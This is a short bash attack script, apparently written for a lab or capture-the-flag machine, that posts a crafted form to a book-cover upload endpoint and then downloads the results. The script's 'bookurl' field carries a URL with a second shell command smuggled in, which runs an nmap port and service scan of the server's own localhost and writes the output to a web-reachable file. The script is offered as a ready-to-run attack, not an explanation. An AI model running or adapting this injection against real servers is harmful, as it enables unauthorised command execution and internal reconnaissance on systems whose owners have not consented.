#!/bin/bash

# Variables
url="http://10.10.11.20/upload-cover"
payload="http://127.0.0.1; nmap -p 1-6000 -sV 127.0.0.1 -oN /tmp/ssrf_scan_results.txt"
result_url="http://10.10.11.20/tmp/ssrf_scan_results.txt"

# Function to perform the SSRF attack
perform_ssrf_attack() {
  echo "Performing SSRF attack..."
  response=$(curl -s -X POST "$url" \
    -H "Host: 10.10.11.20" \
    -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0" \
    -H "Accept: */*" \
    -H "Accept-Language: en-US,en;q=0.5" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Content-Type: multipart/form-data; boundary=---------------------------boundary" \
    --data-binary $'-----------------------------boundary\r\nContent-Disposition: form-data; name="bookurl"\r\n\r\n'"$payload"$'\r\n-----------------------------boundary--')
  echo "SSRF attack performed. Response: $response"
}

# Function to fetch results
fetch_results() {
  echo "Fetching results..."
  results=$(curl -s "$result_url")
  echo "Results fetched: $results"
}

# Execute the functions
perform_ssrf_attack
fetch_results
